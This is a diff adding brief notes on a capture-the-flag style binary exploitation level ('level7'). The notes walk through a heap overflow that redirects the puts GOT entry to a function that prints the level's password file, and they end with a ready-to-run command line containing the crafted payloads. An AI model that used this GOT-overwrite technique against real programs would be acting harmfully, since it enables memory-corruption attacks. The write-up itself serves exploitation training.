@@ -1,0 +1,29 @@
+objdump -R level7  | grep puts => 08049928 (GOAL)
+
+GOAL : modify puts GOT address to address of m that print the output of cat .pass
+
+
+GOAL : 0x08049928 => 0x080484f4
+
+
+HOW:
+
+	strcpy(s1[4], argv[1]);
+	strcpy(s2[4], argv[2]);
+
+	use first strcpy to change the address of s2[4] to 0x08049928 (puts GOT) => to do it, override s2 by HACK\x28\x99\x04\08
+	use second strcpy to change the content of s2[4] to 0x080484f4 (m address)
+
+	HEAP GROWS UP
+
+	s1 = malloc(8); // 0x1c // 0x804a008
+	s1[0] = 1;
+	s1[4] = malloc(8); // 0x804a018 -> adding 16 bytes gets to s2
+
+	s2 = malloc(8); // 0x18 // 0x804a028
+	s2[0] = 2;
+	s2[4] = malloc(8); // 0x804a038
+
+
+
+./level7 $(python -c "print 'a' * 16 + 'HACK\x28\x99\x04\x08' ") $(python -c "print '\xf4\x84\x04\x08'")
